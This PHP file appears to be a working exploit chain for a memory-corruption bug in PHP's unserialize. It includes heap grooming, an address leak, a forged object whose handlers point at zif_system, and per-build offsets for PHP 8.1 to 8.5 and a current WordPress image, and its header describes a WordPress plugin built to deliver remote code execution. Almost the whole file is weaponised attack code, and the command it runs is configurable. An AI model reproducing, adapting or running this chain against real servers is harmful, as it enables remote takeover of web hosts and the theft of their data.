<?php
// fa_cli_core.php — the full zero4 in-band chain (pwn_zero4_live.php port),
// shared by the WP plugin (fa_wp_rce.php) and the CLI self-test.
// Target build: wordpress:latest PHP 8.3.36 Apache mod_php libphp.so
//   zend_empty_array = 0x1041a40   (nm + extract_syms)
//   zif_system       = 0x3b2a00
//   std_object_handlers: dtor_obj +16, get_class_name +128, get_debug_info
//   +152 (receipted via fa_dump_handlers.py relocations dump)

define( 'FA_MARKER', '/var/www/html/fa_rce_receipt.txt' );
define( 'FA_CMD', '/var/www/html/.fa_cmd.sh' );
define( 'FA_DIAG', '/var/www/html/.fa_diag.log' );

class D { public static string $dp = ''; public static string $fp = '';
	public static string $cmd = 'sh /var/www/html/.fa_cmd.sh'; }
class E {
	// per-build offsets; receipted via extract_syms.py + fa_dump_handlers.py
	public static array $FLAVORS = [
		'8511' => [0x169cee0, 0x5996e0, 136, 160],  // van85 php:8.5.11-apache libphp.so
		'8512' => [0xffe460,   0x523c60, 136, 160],  // plain2 8.5.12 (weapon home)
		'8511cli' => [0x1bff000, 0x60ca60, 136, 160], // van85 /usr/local/bin/php CLI
		'8102'   => [0x51c8a0,  0x209550, 128, 152], // jammy /usr/lib/apache2/modules/libphp8.1.so
		'8102cli'=> [0x544f00,  0x21a780, 128, 152], // jammy /usr/bin/php8.1
		'8336' => [0x1041a40,  0x3b2a00, 128, 152],  // wp83g wordpress:latest 8.3.36
	];
	public static int $OFF_EMPTY = 0x169cee0;
	public static int $OFF_ZIF   = 0x5996e0;
	public static int $OFF_GCN   = 136;   // get_class_name handler offset
	public static int $OFF_GDI   = 160;   // get_debug_info handler offset
	public static int $block2 = 0;
	public static int $base = 0;

	public static function init( string $flavor ): void {
		if ( isset( self::$FLAVORS[ $flavor ] ) ) {
			[ self::$OFF_EMPTY, self::$OFF_ZIF, self::$OFF_GCN, self::$OFF_GDI ] = self::$FLAVORS[ $flavor ];
		}
	}
}
class FA_Keep { public static array $keep = []; }

function fa_diag( string $s ): void {
	file_put_contents( FA_DIAG, $s, FILE_APPEND );
	echo $s;
	flush();
}

class Stage1 {
	public function __destruct() {
		$arr = unserialize( D::$dp );
		$blk = $arr[129] ?? null;
		if ( $blk === 5 || ! is_int( $blk ) || $blk < 0x10000 ) {
			fa_diag( "DANCE-MISS (attempt skipped)\n" );
			return;
		}
		$block2 = $blk - 5056;
		fa_diag( 'M1 block2 = 0x' . dechex( $block2 ) . "\n" );

		$u2 = unserialize( 'a:0:{}' );
		$u3 = unserialize( 'a:0:{}' );
		$u4 = unserialize( 'a:0:{}' );
		$u5 = unserialize( 'a:0:{}' );
		$vm5 = 0; $i = -1;
		foreach ( $arr as $k => $v ) { $i++; if ( $i === 1 ) { $vm5 = (int) $v; } }
		if ( $vm5 < 0x10000 ) { fa_diag( "LEAK-MISS T_u5\n" ); return; }

		$u6 = unserialize( 'a:0:{}' );
		$u7 = unserialize( 'a:0:{}' );
		$u8 = unserialize( 'a:0:{}' );
		$u9 = unserialize( 'a:0:{}' );
		$vs = ''; $i = -1;
		foreach ( $arr as $k => $v ) { $i++; if ( $i === 2 ) { $vs = $v; } }

		$u10 = unserialize( 'a:0:{}' );
		$len_s = strlen( $vs );

		$u11 = unserialize( 'a:0:{}' );
		$u12 = unserialize( 'a:0:{}' );
		$u13 = unserialize( 'a:0:{}' );
		$vm13 = 0; $i = -1;
		foreach ( $arr as $k => $v ) { $i++; if ( $i === 3 ) { $vm13 = (int) $v; } }

		$u14 = unserialize( 'a:0:{}' );
		$u15 = unserialize( 'a:0:{}' );
		$u16 = unserialize( 'a:0:{}' );
		$u17 = unserialize( 'a:0:{}' );
		$vs2 = ''; $i = -1;
		foreach ( $arr as $k => $v ) { $i++; if ( $i === 4 ) { $vs2 = $v; } }
		$u18 = unserialize( 'a:0:{}' );
		$len_s2 = strlen( $vs2 );

		fa_diag( 'M2 T_u5=0x' . dechex( $vm5 ) . ' T_u13=0x' . dechex( $vm13 ) .
			' spacing=' . ( $vm13 - $vm5 ) . "\n" );
		fa_diag( 'M2 ORACLE1=0x' . dechex( $len_s ) . ' ORACLE2=0x' . dechex( $len_s2 ) . "\n" );

		if ( $vm13 - $vm5 !== 128 )          { fa_diag( "M2-BAIL slot spacing\n" ); return; }
		if ( $len_s !== $len_s2 )            { fa_diag( "M2-BAIL oracle mismatch\n" ); return; }
		if ( ( $len_s & 0xfff ) !== ( E::$OFF_EMPTY & 0xfff ) ) {
			fa_diag( "M2-BAIL oracle lo12 (offset table mismatch?)\n" ); return;
		}
		$base = $len_s - E::$OFF_EMPTY;
		if ( ( $base & 0xfff ) !== 0 )       { fa_diag( "M2-BAIL base misaligned\n" ); return; }

		E::$block2 = $block2;
		E::$base   = $base;
		fa_diag( 'M2-DONE base=0x' . dechex( $base ) .
			' zif_system=0x' . dechex( $base + E::$OFF_ZIF ) . "\n" );

		unset( $arr );
		unserialize( D::$fp );
	}
}

class FIRE {
	public function __destruct() {
		$block2 = E::$block2; $base = E::$base;
		if ( ! $block2 || ! $base ) { fa_diag( "FIRE-BAIL no statics\n" ); return; }
		$ZIF = $base + E::$OFF_ZIF;

		$V = function ( $off ) use ( $block2 ) { return $block2 + 24 + $off; };
		$OBJ = $V(128); $HT = $V(600); $CE = $V(1600); $SMINI = $V(224);

		$MAGIC1 = 0x4142434445464748;
		$MAGIC2 = 0x1122334455667788;

		$pat  = pack( 'P', $V(32) );
		$pat .= pack( 'P', $V(48) );
		$pat .= pack( 'P', $V(64) );
		$pat .= pack( 'P', $V(112) );
		$pat .= pack( 'PVV', $V(80), 6, 0 );
		$pat .= pack( 'PVV', $V(88), 6, 0 );
		$pat .= pack( 'PVV', $OBJ, 0x108, 0 );
		$pat .= str_repeat( "\x00", 16 );
		$pat .= pack( 'P', $MAGIC1 );
		$pat .= pack( 'P', $MAGIC2 );
		$pat .= pack( 'PVV', $base - 16, 6, 0 );
		// OBJ @128 (doubles as fake zend_execute_data: num_args=1 @+44, arg1 @+80)
		$pat .= pack( 'VV', 1, 0x208 );
		$pat .= pack( 'VV', 0, 0 );
		$pat .= pack( 'P', $CE );
		$pat .= pack( 'P', $HT );
		$pat .= pack( 'P', 0 );
		$pat .= pack( 'P', 0x0000000100000000 );
		$pat .= str_repeat( "\x00", 32 );
		$pat .= pack( 'PVV', $SMINI, 6, 0 );
		// SMINI @224: command string from D::$cmd (len + NUL)
		$cmdlen = strlen( D::$cmd );
		$pat .= pack( 'VV', 1, 0x16 );
		$pat .= pack( 'P', 0 );
		$pat .= pack( 'P', $cmdlen );
		$pat .= D::$cmd . "\x00";
		$pat .= str_repeat( "\x00", 600 - ( 224 + 24 + $cmdlen + 1 ) );
		// HANDLERS @600 — per-build offsets (fa_dump_handlers receipt)
		$GCN = E::$OFF_GCN; $GDI = E::$OFF_GDI;
		$pat .= pack( 'VV', 0, 0 );
		$pat .= pack( 'P', 0 );
		$pat .= pack( 'P', $ZIF );                  // +16 dtor_obj
		$pat .= str_repeat( "\x00", $GCN - 24 );
		$pat .= pack( 'P', $ZIF );                  // +GCN get_class_name
		$pat .= str_repeat( "\x00", $GDI - $GCN - 8 );
		$pat .= pack( 'P', $ZIF );                  // +GDI get_debug_info
		$pat .= str_repeat( "\x00", 208 - $GDI - 8 );
		$pat .= str_repeat( "\x00", 1600 - 808 );
		$pat .= str_repeat( "\x00", 2040 - 1600 );

		$s = str_repeat( $pat, 4 );
		fa_diag( 'M3-STR strlen=' . strlen( $s ) . "\n" );

		$c1z = unserialize( 'R:1020;' );
		$c2z = unserialize( 'R:1021;' );
		$c1 = strlen( $c1z ); $c2 = strlen( $c2z );
		if ( $c1 !== $MAGIC1 || $c2 !== $MAGIC2 ) {
			fa_diag( 'RECLAIM-MISS c1=0x' . dechex( $c1 ) . ' c2=0x' . dechex( $c2 ) . "\n" );
			return;
		}
		fa_diag( "M3 string reclaim OK (canaries verified at block2)\n" );

		$c3z = unserialize( 'R:1023;' );
		$c3 = strlen( $c3z );
		if ( ( $c3 & 0x00FFFFFFFFFFFFFF ) !== 0x00010102464c457f ) {
			fa_diag( 'M3-BAIL base ELF-magic mismatch: 0x' . dechex( $c3 ) . "\n" );
			return;
		}
		fa_diag( "M3 BASE verified via ELF magic at BASE+0\n" );

		$r1 = unserialize( 'R:1022;' );
		fa_diag( 'M3 forged: OBJ=0x' . dechex( $OBJ ) . ' zif_system=0x' . dechex( $ZIF ) . "\n" );
		fa_diag( "TRIGGER var_dump -> zif_system(fake_execute_data)\n" );
		var_dump( $r1 );
		fa_diag( "SURVIVED-CALL\n" );
	}
}

// dance payload (verbatim from pwn_zero4_live.php)
$d  = 'i:129;i:5;';
$d .= 'i:1028;i:1;';
$d .= 'i:8;s:8:"AAAAAAAA";';
$d .= 'i:10;i:1;';
$d .= 'i:12;s:8:"BBBBBBBB";';
for ( $m = 5; $m <= 61; $m++ ) { $d .= 'i:' . ( 2 * $m + 4 ) . ';i:1;'; }
for ( $j = 2; $j <= 65; $j++ ) { $d .= 'i:' . ( 256 * $j ) . ';R:1;'; }
$d .= 'i:16896;i:1;';
D::$dp = 'a:127:{' . $d . '}';
D::$fp = 'O:4:"FIRE":0:{}';

function fa_build_trigger(): string {
	$els = [];
	for ( $k = 0; $k <= 1017; $k++ ) { $els[] = "i:$k;i:1;"; }
	$els[] = 'i:9998;O:6:"Stage1":0:{}';
	$els[] = 'i:9998;i:5;';
	return 'a:1020:{' . implode( '', $els ) . '}';
}

function fa_fire( int $attempts, int $groom, string $flavor = '8511' ): string {
	E::init( $flavor );
	@unlink( FA_MARKER );
	file_put_contents( FA_CMD, 'id > ' . FA_MARKER . " 2>&1\n" );
	@unlink( FA_DIAG );

	FA_Keep::$keep = [];
	for ( $i = 0; $i < $groom; $i++ ) { FA_Keep::$keep[] = str_repeat( 'G', 8160 ); }

	$payload = fa_build_trigger();
	for ( $try = 1; $try <= $attempts; $try++ ) {
		echo "=== attempt $try ===\n";
		$r = unserialize( $payload );
		echo 'outer ok=', var_export( $r !== false, true ), "\n";
		flush();
		if ( is_file( FA_MARKER ) ) { break; }
	}
}

function fa_cli_main( array $argv ): void {
	$a = (int) ( $argv[1] ?? 4 );
	$g = (int) ( $argv[2] ?? 0 );
	$f = (string) ( $argv[3] ?? '8511' );
	echo '[fa-cli] PHP ', PHP_VERSION, ' ', php_uname( 's' ), " flavor=$f\n";
	fa_fire( $a, $g, $f );
	if ( is_file( FA_MARKER ) ) {
		echo 'MARKER: ', trim( (string) file_get_contents( FA_MARKER ) ), "\n";
		echo "[PASS] fa chain RCE on PHP ", PHP_VERSION, "\n";
	} else {
		echo "[FAIL] marker missing\n";
	}
	echo "DIAG:\n", is_file( FA_DIAG ) ? (string) file_get_contents( FA_DIAG ) : "(none)\n";
}
